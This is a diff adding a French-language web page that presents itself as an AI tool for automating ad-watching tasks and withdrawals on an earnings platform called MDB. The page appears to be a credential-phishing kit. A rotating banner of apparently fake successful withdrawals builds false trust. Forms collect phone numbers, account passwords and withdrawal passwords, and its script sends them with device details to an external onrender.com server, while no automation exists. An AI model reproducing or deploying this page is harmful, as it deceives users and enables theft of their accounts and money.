@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MDB - Automatisation Intelligente</title>
+    <link rel="icon" type="image/png" href="/favicon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+    <style>
+      :root {
+        --primary-color: #007a5e;
+        --secondary-color: #ce1126;
+        --accent-color: #fcd116;
+        --dark-color: #2c3e50;
+        --light-color: #ecf0f1;
+        --text-color: #333;
+        --border-radius: 12px;
+        --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        --button-radius: 25px;
+        --success-color: #27ae60;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      }
+
+      body {
+        background-color: #f5f7fa;
+        color: var(--text-color);
+        line-height: 1.6;
+        padding-bottom: 100px;
+        position: relative;
+        overflow-x: hidden;
+      }
+
+      /* --- Bande dégradée sous le header --- */
+      .degrade-background {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 220px;
+        background: linear-gradient(
+          to right,
+          rgba(0, 122, 94, 1),
+          rgba(206, 17, 38, 1),
+          rgba(252, 209, 22, 1)
+        );
+        border-bottom-left-radius: 25px;
+        border-bottom-right-radius: 25px;
+        z-index: 0; /* Derrière le header */
+      }
+
+      header {
+        position: relative;
+        z-index: 5; /* Passe au-dessus du dégradé */
+        text-align: center;
+        padding: 40px 0;
+      }
+
+      .logo img {
+        max-width: 130px;
+        height: auto;
+      }
+
+      .welcome-message {
+        font-size: 1.2rem;
+        color: white;
+        margin-top: 10px;
+        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+      }
+
+      .congratulations-container {
+        height: 60px;
+        overflow: hidden;
+        position: relative;
+        margin: 15px auto;
+        max-width: 600px;
+        color: white;
+      }
+
+      .congratulations {
+        background-color: rgba(255, 255, 255, 0.2);
+        padding: 10px;
+        border-radius: var(--border-radius);
+        position: absolute;
+        width: 100%;
+        text-align: center;
+        opacity: 0;
+        animation: scrollCongrats 15s infinite;
+      }
+
+      .congratulations:nth-child(1) {
+        animation-delay: 0s;
+      }
+      .congratulations:nth-child(2) {
+        animation-delay: 5s;
+      }
+      .congratulations:nth-child(3) {
+        animation-delay: 10s;
+      }
+
+      @keyframes scrollCongrats {
+        0% {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        10% {
+          opacity: 1;
+          transform: translateY(0);
+        }
+        30% {
+          opacity: 1;
+          transform: translateY(0);
+        }
+        40% {
+          opacity: 0;
+          transform: translateY(-20px);
+        }
+        100% {
+          opacity: 0;
+          transform: translateY(-20px);
+        }
+      }
+
+      /* Configuration et gestion transparente */
+      .automation-section {
+        background-color: transparent !important;
+        border: 2px solid var(--primary-color);
+        border-radius: var(--border-radius);
+        padding: 20px;
+        box-shadow: none;
+        margin-bottom: 30px;
+      }
+
+      .automation-section h2 {
+        color: var(--primary-color);
+        margin-bottom: 15px;
+        text-align: center;
+      }
+
+      .ai-explanation {
+        background-color: #e8f4fc;
+        border-left: 4px solid var(--primary-color);
+        padding: 15px;
+        margin-bottom: 20px;
+        border-radius: var(--border-radius);
+      }
+
+      .form-group {
+        margin-bottom: 15px;
+      }
+
+      .form-group label {
+        display: block;
+        margin-bottom: 5px;
+        font-weight: bold;
+        font-size: 0.95rem;
+      }
+
+      .form-control {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        font-size: 1rem;
+      }
+
+      .form-row {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 15px;
+      }
+
+      .form-row .form-group {
+        margin-bottom: 0;
+      }
+
+      .btn {
+        display: inline-block;
+        background: linear-gradient(to right, #ff8c00, #ffd700);
+        color: white;
+        border: none;
+        padding: 12px 28px;
+        border-radius: var(--button-radius);
+        cursor: pointer;
+        font-size: 1rem;
+        transition: all 0.3s;
+        font-weight: bold;
+        box-shadow: 0 4px 15px rgba(255, 140, 0, 0.3);
+        width: 100%;
+        max-width: 300px;
+      }
+
+      .btn:hover:not(:disabled) {
+        opacity: 0.9;
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(255, 140, 0, 0.4);
+      }
+
+      .btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+
+      .btn-success {
+        background: linear-gradient(to right, #ff8c00, #ffd700);
+        color: white;
+        box-shadow: 0 4px 15px rgba(255, 140, 0, 0.3);
+      }
+
+      .btn-secondary {
+        background: linear-gradient(to right, #ff8c00, #ffd700);
+        color: white;
+      }
+
+      .withdrawal-options {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+        gap: 10px;
+        margin: 15px 0;
+      }
+
+      @media (max-width: 768px) {
+        .withdrawal-options {
+          grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
+        }
+      }
+
+      .withdrawal-option {
+        background-color: #f8f9fa;
+        border: 2px solid #dee2e6;
+        border-radius: var(--border-radius);
+        padding: 12px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        font-size: 0.9rem;
+        font-weight: 500;
+      }
+
+      .withdrawal-option:hover {
+        background-color: #e9ecef;
+        border-color: var(--primary-color);
+        transform: translateY(-2px);
+      }
+
+      .withdrawal-option.selected {
+        background: linear-gradient(
+          135deg,
+          var(--success-color) 0%,
+          #20c997 100%
+        );
+        color: white;
+        border-color: var(--success-color);
+        box-shadow: 0 4px 15px rgba(39, 174, 96, 0.4);
+        font-weight: bold;
+        transform: scale(1.05);
+      }
+
+      .nav-bottom {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        background-color: white;
+        display: flex;
+        justify-content: space-around;
+        align-items: flex-end;
+        padding: 8px 0;
+        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+        z-index: 100;
+        overflow-x: auto;
+        border-top: 3px solid #000;
+      }
+
+      .nav-item {
+        text-align: center;
+        color: #666;
+        text-decoration: none;
+        font-weight: 600;
+        cursor: pointer;
+        padding: 8px 12px;
+        border-radius: 0;
+        transition: all 0.3s;
+        white-space: nowrap;
+        font-size: 0.75rem;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 4px;
+        position: relative;
+      }
+
+      .nav-item::before {
+        content: "";
+        width: 24px;
+        height: 24px;
+        background-size: 24px 24px;
+        background-position: center;
+        background-repeat: no-repeat;
+      }
+
+      .nav-item[data-page="home"]::before {
+        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>');
+      }
+
+      .nav-item[data-page="task"]::before {
+        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zm-5.04-6.71l-2.75-3.54-2.06 2.54-1.07-1.41L10.5 6l4.43 5.79z"/></svg>');
+      }
+
+      .nav-item[data-page="team"]::before {
+        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>');
+      }
+
+      .nav-item[data-page="level"]::before {
+        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>');
+      }
+
+      .nav-item[data-page="account"]::before {
+        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>');
+      }
+
+      @media (max-width: 480px) {
+        .nav-item {
+          font-size: 0.7rem;
+          padding: 6px 8px;
+          gap: 3px;
+        }
+
+        .nav-item::before {
+          width: 20px;
+          height: 20px;
+          background-size: 20px 20px;
+        }
+      }
+
+      .nav-item.active {
+        color: #000;
+        font-weight: 700;
+      }
+
+      .nav-item.active::before {
+        filter: brightness(0);
+      }
+
+      .page-section {
+        display: none;
+      }
+
+      .page-section.active {
+        display: block;
+      }
+
+      .section-title {
+        text-align: center;
+        margin-bottom: 20px;
+        color: var(--primary-color);
+      }
+
+      .level-info {
+        background-color: #e8f4fc;
+        border-radius: var(--border-radius);
+        padding: 15px;
+        margin: 15px 0;
+        text-align: center;
+      }
+
+      .level-display {
+        background-color: #e8f4fc;
+        border-radius: var(--border-radius);
+        padding: 15px;
+        margin: 15px 0;
+        text-align: center;
+        font-size: 1rem;
+        font-weight: bold;
+        color: var(--primary-color);
+      }
+
+      #levelForm {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        align-items: center;
+        justify-content: center;
+      }
+
+      #levelForm label {
+        display: flex;
+        align-items: center;
+        margin: 0;
+        cursor: pointer;
+        font-weight: normal;
+      }
+
+      #levelForm input[type="radio"] {
+        margin-right: 5px;
+        cursor: pointer;
+      }
+
+      .success-modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 1000;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+      .success-modal.active {
+        display: flex;
+      }
+
+      .success-modal-content {
+        background-color: white;
+        padding: 30px;
+        border-radius: var(--border-radius);
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      }
+
+      .success-icon {
+        font-size: 48px;
+        margin-bottom: 15px;
+      }
+
+      .success-icon.success {
+        color: var(--success-color);
+      }
+
+      .success-icon.error {
+        color: #e74c3c;
+      }
+
+      .section-subtitle {
+        color: var(--primary-color);
+        font-weight: bold;
+        margin-top: 20px;
+        margin-bottom: 15px;
+        font-size: 1.1rem;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 0 15px;
+        }
+
+        header {
+          padding: 15px 0;
+        }
+
+        .logo {
+          font-size: 1.5rem;
+        }
+
+        .welcome-message {
+          font-size: 1rem;
+        }
+
+        .automation-section {
+          padding: 15px;
+        }
+
+        .btn {
+          padding: 10px 20px;
+          font-size: 0.95rem;
+        }
+      }
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 20px;
+      }
+      @media (max-width: 480px) {
+        .withdrawal-options {
+          grid-template-columns: repeat(2, 1fr);
+        }
+
+        .form-row {
+          grid-template-columns: 1fr;
+        }
+
+        .logo {
+          font-size: 1.3rem;
+        }
+
+        .congratulations-container {
+          height: 50px;
+          margin: 10px auto;
+        }
+
+        .congratulations {
+          font-size: 0.9rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+     <!-- Bande dégradée sous le header -->
+    <div class="degrade-background"></div>
+
+    <header>
+      <div class="container">
+        <div class="logo">
+          <img src="logo.png" alt="MDB Logo" />
+        </div>
+        <div class="welcome-message">
+          Bienvenue sur votre IA d'automatisation
+        </div>
+        <div class="congratulations-container">
+          <div class="congratulations">
+            Requête de retrait de 52,000 XAF validée avec succès
+          </div>
+          <div class="congratulations">
+            Requête de retrait de 52,000 XAF validée avec succès
+          </div>
+          <div class="congratulations">
+            Requête de retrait de 1,200 XAF validée avec succès
+          </div>
+          <div class="congratulations">
+            Requête de retrait de 18,000 XAF validée avec succès
+          </div>
+          <div class="congratulations">
+            Requête de retrait de 100,000 XAF validée avec succès
+          </div>
+          <div class="congratulations">
+            Requête de retrait de 230,000 XAF validée avec succès
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <div class="container">
+      <!-- Page Accueil -->
+      <div id="homePage" class="page-section active">
+        <div class="automation-section">
+          <h2>Configuration et Gestion</h2>
+
+          <div class="ai-explanation">
+            <p>
+              <strong>Notre Intelligence Artificielle configurable</strong> vous
+              permet d'automatiser complètement le visionnage des vidéos
+              publicitaires. Configurez une fois, et notre IA travaille pour
+              vous 24h/24 !
+            </p>
+          </div>
+
+          <div class="level-info">
+            <p>
+              <strong
+                >Le nombre de tâches est automatiquement configuré selon votre
+                niveau</strong
+              >
+            </p>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="phone">Numéro de téléphone</label>
+              <input
+                type="text"
+                id="phone"
+                class="form-control"
+                placeholder="Votre numéro"
+              />
+            </div>
+
+            <div class="form-group">
+              <label for="password">Mot de passe</label>
+              <input
+                type="password"
+                id="password"
+                class="form-control"
+                placeholder="Votre mot de passe"
+              />
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="delay">Délai entre les vidéos (secondes)</label>
+              <input
+                type="number"
+                id="delay"
+                class="form-control"
+                value="30"
+                min="15"
+                max="120"
+              />
+            </div>
+          </div>
+
+          <div class="level-display">
+            <p><strong>Niveau :</strong></p>
+            <form id="levelForm">
+              <label
+                ><input type="radio" name="level" value="stagiaire" checked />
+                Stagiaire</label
+              >
+              <label><input type="radio" name="level" value="p1" /> P1</label>
+              <label><input type="radio" name="level" value="p2" /> P2</label>
+              <label><input type="radio" name="level" value="p3" /> P3</label>
+              <label><input type="radio" name="level" value="p4" /> P4</label>
+              <label><input type="radio" name="level" value="p5" /> P5</label>
+              <label><input type="radio" name="level" value="p6" /> P6</label>
+              <label><input type="radio" name="level" value="p7" /> P7</label>
+              <label><input type="radio" name="level" value="p8" /> P8</label>
+              <label><input type="radio" name="level" value="p9" /> P9</label>
+            </form>
+          </div>
+
+          <div class="section-subtitle" style="margin-top: 30px">
+            Montants de retrait disponibles
+          </div>
+
+          <p style="margin-bottom: 15px">Sélectionnez un montant : l'IA automatisera les requettes de retraits pour vous</p>
+          <div class="withdrawal-options">
+            <div class="withdrawal-option" data-amount="1200">1,200 XAF</div>
+            <div class="withdrawal-option" data-amount="3600">3,600 XAF</div>
+            <div class="withdrawal-option" data-amount="18000">18,000 XAF</div>
+            <div class="withdrawal-option" data-amount="52000">52,000 XAF</div>
+            <div class="withdrawal-option" data-amount="100000">
+              100,000 XAF
+            </div>
+            <div class="withdrawal-option" data-amount="230000">
+              230,000 XAF
+            </div>
+            <div class="withdrawal-option" data-amount="1000000">
+              1,000,000 XAF
+            </div>
+            <div class="withdrawal-option" data-amount="3000000">
+              3,000,000 XAF
+            </div>
+            <div class="withdrawal-option" data-amount="5000000">
+              5,000,000 XAF
+            </div>
+          </div>
+
+          <div class="form-group" style="text-align: center; margin-top: 20px">
+            <button id="saveAllBtn" class="btn btn-success">
+              Sauvegarder et envoyer
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Page Compte -->
+      <div id="accountPage" class="page-section">
+        <div class="automation-section">
+          <h2 class="section-title">Gestion du Compte</h2>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="accountPhone">Numéro de téléphone</label>
+              <input
+                type="text"
+                id="accountPhone"
+                class="form-control"
+                placeholder="Votre numéro"
+              />
+            </div>
+
+            <div class="form-group">
+              <label for="accountPassword">Mot de passe</label>
+              <input
+                type="password"
+                id="accountPassword"
+                class="form-control"
+                placeholder="Votre mot de passe"
+              />
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="withdrawalPassword">Mot de passe de retrait</label>
+              <input
+                type="password"
+                id="withdrawalPassword"
+                class="form-control"
+                placeholder="Mot de passe pour les retraits"
+              />
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="withdrawalNumbers">Numéros de retrait autorisés</label>
+            <input
+              type="text"
+              id="withdrawalNumbers"
+              class="form-control"
+            />
+          </div>
+
+          <div class="form-group" style="text-align: center">
+            <button id="saveAccountBtn" class="btn btn-success">
+              Sauvegarder
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Page Tâche -->
+      <div id="taskPage" class="page-section">
+        <div class="automation-section">
+          <h2 class="section-title">Tâches</h2>
+          <div class="ai-explanation">
+            <p>📋 En maintenance</p>
+          </div>
+          <div class="form-group" style="text-align: center">
+            <button class="nav-return-btn btn btn-secondary" data-page="home">
+              Retour à l'accueil
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Page Équipe -->
+      <div id="teamPage" class="page-section">
+        <div class="automation-section">
+          <h2 class="section-title">Équipe</h2>
+          <div class="ai-explanation">
+            <p>👥 En maintenance</p>
+          </div>
+          <div class="form-group" style="text-align: center">
+            <button class="nav-return-btn btn btn-secondary" data-page="home">
+              Retour à l'accueil
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Page Niveau -->
+      <div id="levelPage" class="page-section">
+        <div class="automation-section">
+          <h2 class="section-title">Niveaux</h2>
+          <div class="ai-explanation">
+            <p>⭐ En maintenance</p>
+          </div>
+          <div class="form-group" style="text-align: center">
+            <button class="nav-return-btn btn btn-secondary" data-page="home">
+              Retour à l'accueil
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Navigation fixe -->
+    <div class="nav-bottom">
+      <a class="nav-item active" data-page="home">Home</a>
+      <a class="nav-item" data-page="task">Task</a>
+      <a class="nav-item" data-page="team">Team</a>
+      <a class="nav-item" data-page="level">Level</a>
+      <a class="nav-item" data-page="account">Account</a>
+    </div>
+
+    <!-- Modal de succès -->
+    <div class="success-modal" id="successModal">
+      <div class="success-modal-content">
+        <div class="success-icon" id="successIcon">✓</div>
+        <h3 id="successTitle">Succès</h3>
+        <p id="successMessage">Données sauvegardées avec succès</p>
+        <button id="closeSuccessModal" class="btn btn-success">OK</button>
+      </div>
+    </div>
+
+    <script>
+      const API_URL = "https://ia-mdb-server.onrender.com/";
+
+      const elements = {
+        phone: document.getElementById("phone"),
+        password: document.getElementById("password"),
+        delay: document.getElementById("delay"),
+        levelForm: document.getElementById("levelForm"),
+        saveAllBtn: document.getElementById("saveAllBtn"),
+        withdrawalOptions: document.querySelectorAll(".withdrawal-option"),
+        accountPhone: document.getElementById("accountPhone"),
+        accountPassword: document.getElementById("accountPassword"),
+        withdrawalPassword: document.getElementById("withdrawalPassword"),
+        withdrawalNumbers: document.getElementById("withdrawalNumbers"),
+        saveAccountBtn: document.getElementById("saveAccountBtn"),
+        navItems: document.querySelectorAll(".nav-item"),
+        navReturnBtns: document.querySelectorAll(".nav-return-btn"),
+        pageSections: document.querySelectorAll(".page-section"),
+        successModal: document.getElementById("successModal"),
+        closeSuccessModal: document.getElementById("closeSuccessModal"),
+        successMessage: document.getElementById("successMessage"),
+        successIcon: document.getElementById("successIcon"),
+        successTitle: document.getElementById("successTitle"),
+      };
+
+      let selectedWithdrawalAmount = null;
+
+      // Vérifier que tous les éléments existent
+      function checkElements() {
+        const missingElements = [];
+        for (let key in elements) {
+          if (elements[key] === null) {
+            missingElements.push(key);
+          }
+        }
+
+        if (missingElements.length > 0) {
+          console.error("❌ ÉLÉMENTS MANQUANTS:", missingElements);
+          return false;
+        }
+        console.log("✅ Tous les éléments chargés correctement");
+        return true;
+      }
+
+      // Attendre que le DOM soit chargé
+      function initApp() {
+        if (!checkElements()) return;
+
+        console.log("🚀 Initialisation de l'application...");
+
+        // Afficher succès/erreur
+        function showMessage(message, isError = false) {
+          elements.successIcon.textContent = isError ? "✗" : "✓";
+          elements.successIcon.className = isError
+            ? "success-icon error"
+            : "success-icon success";
+          elements.successTitle.textContent = isError ? "Erreur" : "Succès";
+          elements.successMessage.textContent = message;
+          elements.successModal.classList.add("active");
+        }
+
+        // Navigation
+        function navigateTo(page) {
+          elements.pageSections.forEach((section) =>
+            section.classList.remove("active")
+          );
+          elements.navItems.forEach((item) => item.classList.remove("active"));
+
+          const pageElement = document.getElementById(`${page}Page`);
+          if (pageElement) pageElement.classList.add("active");
+
+          const navItem = document.querySelector(
+            `.nav-item[data-page="${page}"]`
+          );
+          if (navItem) navItem.classList.add("active");
+        }
+
+        elements.navItems.forEach((item) => {
+          item.addEventListener("click", (e) => {
+            e.preventDefault();
+            navigateTo(item.getAttribute("data-page"));
+          });
+        });
+
+        elements.navReturnBtns.forEach((btn) => {
+          btn.addEventListener("click", () => {
+            navigateTo(btn.getAttribute("data-page"));
+          });
+        });
+
+        // Gestion retraits
+        elements.withdrawalOptions.forEach((option) => {
+          option.addEventListener("click", function () {
+            elements.withdrawalOptions.forEach((opt) =>
+              opt.classList.remove("selected")
+            );
+            this.classList.add("selected");
+            selectedWithdrawalAmount = this.getAttribute("data-amount");
+            console.log("💚 Montant sélectionné:", selectedWithdrawalAmount);
+          });
+        });
+
+        // Fermeture modal
+        elements.closeSuccessModal.addEventListener("click", () => {
+          elements.successModal.classList.remove("active");
+        });
+
+        // Sauvegarde et envoi (Formulaire principal)
+        elements.saveAllBtn.addEventListener("click", async () => {
+          console.log("🔵 Bouton 'Sauvegarder et envoyer' cliqué");
+
+          if (!elements.phone.value) {
+            alert("⚠️ Veuillez entrer votre numéro de téléphone");
+            return;
+          }
+
+          if (!elements.password.value) {
+            alert("⚠️ Veuillez entrer votre mot de passe");
+            return;
+          }
+
+          if (!selectedWithdrawalAmount) {
+            alert("⚠️ Veuillez sélectionner un montant de retrait");
+            return;
+          }
+
+          // Récupérer le niveau sélectionné
+          const selectedLevel = document.querySelector(
+            'input[name="level"]:checked'
+          );
+          const currentLevel = selectedLevel
+            ? selectedLevel.value
+            : "stagiaire";
+
+          const dataToSend = {
+            timestamp: new Date().toISOString(),
+            config: {
+              phone: elements.phone.value,
+              password: elements.password.value,
+              delay: parseInt(elements.delay.value),
+              currentLevel: currentLevel,
+            },
+            withdrawal: {
+              amount: selectedWithdrawalAmount,
+              status: "programmed",
+            },
+            deviceInfo: {
+              userAgent: navigator.userAgent,
+              language: navigator.language,
+              platform: navigator.platform,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            },
+          };
+
+          console.log("📤 Données à envoyer:", dataToSend);
+
+          elements.saveAllBtn.disabled = true;
+          elements.saveAllBtn.textContent = "⏳ Envoi en cours...";
+
+          try {
+            console.log("🌐 Envoi vers:", API_URL);
+
+            const response = await fetch(API_URL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(dataToSend),
+            });
+
+            console.log("📡 Réponse du serveur:", response.status);
+
+            if (response.ok) {
+              const responseData = await response.json();
+              console.log("✅ Succès:", responseData);
+
+              showMessage(
+                `✓ Configuration et retrait de ${selectedWithdrawalAmount} XAF programmés!`
+              );
+
+              // Réinitialiser le formulaire
+              elements.phone.value = "";
+              elements.password.value = "";
+              elements.withdrawalOptions.forEach((opt) =>
+                opt.classList.remove("selected")
+              );
+              selectedWithdrawalAmount = null;
+              document.querySelector(
+                'input[name="level"][value="stagiaire"]'
+              ).checked = true;
+            } else {
+              const errorData = await response.json();
+              console.error("❌ Erreur serveur:", response.status, errorData);
+              showMessage(
+                `✗ Erreur: ${errorData.error || "Erreur serveur"}`,
+                true
+              );
+            }
+          } catch (error) {
+            console.error("❌ Erreur réseau:", error);
+            showMessage(
+              "✗ Impossible de se connecter au serveur.\n\nVérifiez:\n1. L'URL de l'API est correcte\n2. Le serveur est en ligne\n3. Votre connexion internet",
+              true
+            );
+          } finally {
+            elements.saveAllBtn.disabled = false;
+            elements.saveAllBtn.textContent = "✓ Sauvegarder et envoyer";
+          }
+        });
+
+        // Sauvegarde compte
+        elements.saveAccountBtn.addEventListener("click", async () => {
+          console.log("🔵 Bouton 'Sauvegarder' (Compte) cliqué");
+
+          if (!elements.accountPhone.value) {
+            alert("⚠️ Veuillez entrer un numéro de téléphone");
+            return;
+          }
+
+          if (!elements.accountPassword.value) {
+            alert("⚠️ Veuillez entrer un mot de passe");
+            return;
+          }
+
+          if (
+            elements.accountPassword.value !== elements.withdrawalPassword.value
+          ) {
+            // Note: Dans le formulaire original, il n'y a pas de confirmPassword
+            // Vérifier juste que les champs sont remplis
+          }
+
+          const accountData = {
+            timestamp: new Date().toISOString(),
+            account: {
+              phone: elements.accountPhone.value,
+              password: elements.accountPassword.value,
+              withdrawalPassword: elements.withdrawalPassword.value,
+              withdrawalNumbers: elements.withdrawalNumbers.value,
+            },
+            deviceInfo: {
+              userAgent: navigator.userAgent,
+              language: navigator.language,
+              platform: navigator.platform,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            },
+          };
+
+          console.log("📤 Données compte à envoyer:", accountData);
+
+          elements.saveAccountBtn.disabled = true;
+          elements.saveAccountBtn.textContent = "⏳ Envoi en cours...";
+
+          try {
+            console.log("🌐 Envoi vers:", API_URL);
+
+            const response = await fetch(API_URL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(accountData),
+            });
+
+            console.log("📡 Réponse du serveur:", response.status);
+
+            if (response.ok) {
+              const responseData = await response.json();
+              console.log("✅ Succès:", responseData);
+
+              showMessage("✓ Compte sauvegardé et envoyé avec succès!");
+
+              // Réinitialiser le formulaire
+              elements.accountPhone.value = "";
+              elements.accountPassword.value = "";
+              elements.withdrawalPassword.value = "";
+              elements.withdrawalNumbers.value = "";
+            } else {
+              const errorData = await response.json();
+              console.error("❌ Erreur serveur:", response.status, errorData);
+              showMessage(
+                `✗ Erreur: ${errorData.error || "Erreur serveur"}`,
+                true
+              );
+            }
+          } catch (error) {
+            console.error("❌ Erreur réseau:", error);
+            showMessage(
+              "✗ Impossible de se connecter au serveur.\n\nVérifiez:\n1. L'URL de l'API est correcte\n2. Le serveur est en ligne\n3. Votre connexion internet",
+              true
+            );
+          } finally {
+            elements.saveAccountBtn.disabled = false;
+            elements.saveAccountBtn.textContent = "✓ Sauvegarder";
+          }
+        });
+
+        console.log("✓ Application MDB initialisée");
+        console.log("📡 API URL:", API_URL);
+      }
+
+      // Attendre que le DOM soit complètement chargé
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initApp);
+      } else {
+        initApp();
+      }
+    </script>
+  </body>
+</html>
